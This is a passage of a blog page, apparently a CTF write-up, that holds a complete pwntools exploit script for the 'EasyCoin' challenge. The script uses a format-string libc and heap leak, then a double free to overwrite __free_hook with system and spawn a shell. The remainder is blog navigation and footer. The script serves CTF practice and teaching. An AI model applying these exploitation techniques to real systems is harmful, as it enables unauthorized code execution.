class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, endian=<span class="string">'little'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./EasyCoin'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./EasyCoin'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username,password)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'which command?'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'username\n&gt; '</span>)</span><br><span class="line">	p.sendline(username)</span><br><span class="line">	p.recvuntil(<span class="string">'password\n&gt; '</span>)</span><br><span class="line">	p.sendline(password)</span><br><span class="line">	p.recvuntil(<span class="string">'password\n&gt; '</span>)</span><br><span class="line">	p.sendline(password)</span><br><span class="line">	p.recvuntil(<span class="string">' Registration success'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username,password)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'which command?'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">2</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'username\n&gt; '</span>)</span><br><span class="line">	p.sendline(username)</span><br><span class="line">	p.recvuntil(<span class="string">'password\n&gt; '</span>)</span><br><span class="line">	p.sendline(password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendCoin</span><span class="params">(send2user,sendNum)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'command?'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">2</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'send to?\n&gt; '</span>)</span><br><span class="line">	p.sendline(send2user)</span><br><span class="line">	p.recvuntil(<span class="string">'many?\n&gt; '</span>)</span><br><span class="line">	p.sendline(str(sendNum))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changePass</span><span class="params">(newPass)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'command?'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">4</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'password\n&gt; '</span>)</span><br><span class="line">	p.sendline(newPass)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'command?'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'command?'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">6</span>))</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">register(<span class="string">'e3pem'</span>,<span class="string">'a'</span>*<span class="number">16</span>+<span class="string">'\x30'</span>)</span><br><span class="line">register(<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">register(<span class="string">'/bin/sh'</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">login(<span class="string">'e3pem'</span>,<span class="string">'a'</span>*<span class="number">16</span>+<span class="string">'\x30'</span>)</span><br><span class="line"></span><br><span class="line">e3pem_pass_off = <span class="number">0x70</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,gdbscript='''</span></span><br><span class="line"><span class="comment"># b *0x401686</span></span><br><span class="line"><span class="comment"># b *0x40159d</span></span><br><span class="line"><span class="comment"># 	''')</span></span><br><span class="line"><span class="comment"># raw_input('aaa')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line">p.recvuntil(<span class="string">'which command?'</span>)</span><br><span class="line">p.send(<span class="string">'%3$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">'\x7f'</span>)[:<span class="number">-2</span>], <span class="number">16</span>)<span class="number">-0xf72c0</span></span><br><span class="line">libc_system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">print(<span class="string">'system addr:'</span>+hex(libc_system))</span><br><span class="line">print(<span class="string">'free_hook:'</span>+hex(free_hook))</span><br><span class="line"><span class="comment"># leak heap base</span></span><br><span class="line">p.recvuntil(<span class="string">'which command?'</span>)</span><br><span class="line">p.send(<span class="string">'%9$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">heap_base = int(p.recvuntil(<span class="string">'\x7f'</span>)[:<span class="number">-2</span>],<span class="number">16</span>)&amp;<span class="number">0xFFFFF000</span></span><br><span class="line">print(<span class="string">'heap_base:'</span>+hex(heap_base))</span><br><span class="line">changePass(p64(heap_base+e3pem_pass_off))</span><br><span class="line"><span class="comment"># make bss_serial_num to 0x21, double free</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x2E</span>):</span><br><span class="line">	sendCoin(<span class="string">'/bin/sh'</span>,<span class="number">1</span>)</span><br><span class="line">logout()</span><br><span class="line"></span><br><span class="line">login(<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">sendCoin(<span class="string">'e3pem'</span>,<span class="number">0x3</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line">register(<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">login(<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">sendCoin(<span class="string">'e3pem'</span>,heap_base+e3pem_pass_off)</span><br><span class="line">sendCoin(<span class="string">'bbbb'</span>,<span class="number">0x4</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line"><span class="comment"># user bbbb's password chunk = e3pem's password chunk</span></span><br><span class="line">register(<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">login(<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">changePass(p64(<span class="number">0x6030e0</span>))</span><br><span class="line">logout()</span><br><span class="line"></span><br><span class="line"><span class="comment"># user cccc's name chunk = user e3pem's password chunk</span></span><br><span class="line"><span class="comment"># user cccc's password chunk = 0x6030e0(bss)</span></span><br><span class="line">register(<span class="string">'cccc'</span>,<span class="string">'cccc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># use user /bin/sh's password chunk to create a fake user struct</span></span><br><span class="line"><span class="comment"># let the password ptr point to __free_hook </span></span><br><span class="line">login(<span class="string">'/bin/sh'</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">name_off = <span class="number">0x160</span></span><br><span class="line"><span class="comment"># fake user struct, password --&gt; free_hook</span></span><br><span class="line">payload = p64(heap_base+name_off)+p64(free_hook)+p64(<span class="number">0x88888888</span>)+<span class="string">'\x00'</span>*<span class="number">6</span></span><br><span class="line">changePass(payload)</span><br><span class="line">logout()</span><br><span class="line"></span><br><span class="line"><span class="comment"># edit bss's user_struct ptr, make first element point to fake user struct</span></span><br><span class="line">login(<span class="string">'cccc'</span>,<span class="string">'cccc'</span>)</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x10</span>+p64(heap_base+name_off+<span class="number">0x30</span>)+p64(<span class="number">0</span>)</span><br><span class="line">changePass(payload)</span><br><span class="line">logout()</span><br><span class="line"></span><br><span class="line"><span class="comment"># /bin/sh's password = __free_hook, value is 0</span></span><br><span class="line"><span class="comment"># so we can login without password</span></span><br><span class="line">login(<span class="string">'/bin/sh'</span>,<span class="string">''</span>)</span><br><span class="line">changePass(p64(libc_system))</span><br><span class="line"><span class="comment"># __free_hook=system, call system('/bin/sh')</span></span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/15/0ctf-2018/0ctf-baby题/" rel="next" title="0ctf2018-baby题">
+                <i class="fa fa-chevron-left"></i> 0ctf2018-baby题
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/12/04/huwangbei/huwangbei-1/" rel="prev" title="护网杯-部分writeup">
+                护网杯-部分writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">e3pem</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/e3pem" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:ymyushouxi@163.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i></a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://p4nda.top/" title="P4nda" target="_blank">P4nda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sunichi.github.io/" title="Sunichi" target="_blank">Sunichi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ble55ing.github.io/" title="Ble55ing" target="_blank">Ble55ing</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://p1umer.github.io/" title="P1umer" target="_blank">P1umer</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ama2in9.top/" title="Ama2in9" target="_blank">Ama2in9</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xiaoxiaorenwu.top/" title="xiaoxiaorenwu" target="_blank">xiaoxiaorenwu</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#网鼎杯-EasyCoin"><span class="nav-number">1.</span> <span class="nav-text">网鼎杯-EasyCoin</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#程序分析"><span class="nav-number">1.1.</span> <span class="nav-text">程序分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#用户管理功能"><span class="nav-number">1.1.1.</span> <span class="nav-text">用户管理功能</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用户登录后的功能"><span class="nav-number">1.1.2.</span> <span class="nav-text">用户登录后的功能</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用思路"><span class="nav-number">1.3.</span> <span class="nav-text">利用思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息泄露"><span class="nav-number">1.3.1.</span> <span class="nav-text">信息泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#double-free"><span class="nav-number">1.3.2.</span> <span class="nav-text">double free</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用代码"><span class="nav-number">1.4.</span> <span class="nav-text">利用代码</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">e3pem</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
